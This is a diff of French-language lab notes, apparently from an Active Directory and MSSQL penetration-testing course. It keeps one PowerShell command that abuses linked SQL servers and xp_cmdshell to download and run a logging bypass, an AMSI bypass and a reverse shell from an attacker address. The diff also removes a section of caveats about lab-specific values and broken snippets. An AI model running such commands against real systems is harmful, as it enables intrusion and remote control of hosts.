@@ -947,9 +947,3 @@ Le dernier bloc source est incomplet : il est conservé pour ne pas perdre l'ext
 ```powershell
 Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/Invoke-PowerShellTcpEx.ps1)
 ```
-
-## Points de vigilance sur les notes source
-
-- Les commandes et leurs paramètres sont conservés depuis le document d'origine ; certains noms de comptes, chemins et secrets sont propres au laboratoire.
-- Quelques extraits semblent contenir des erreurs de syntaxe ou des éléments incomplets. Ils sont signalés plutôt que corrigés silencieusement.
-- Les 13 illustrations du chapitre source sont conservées.
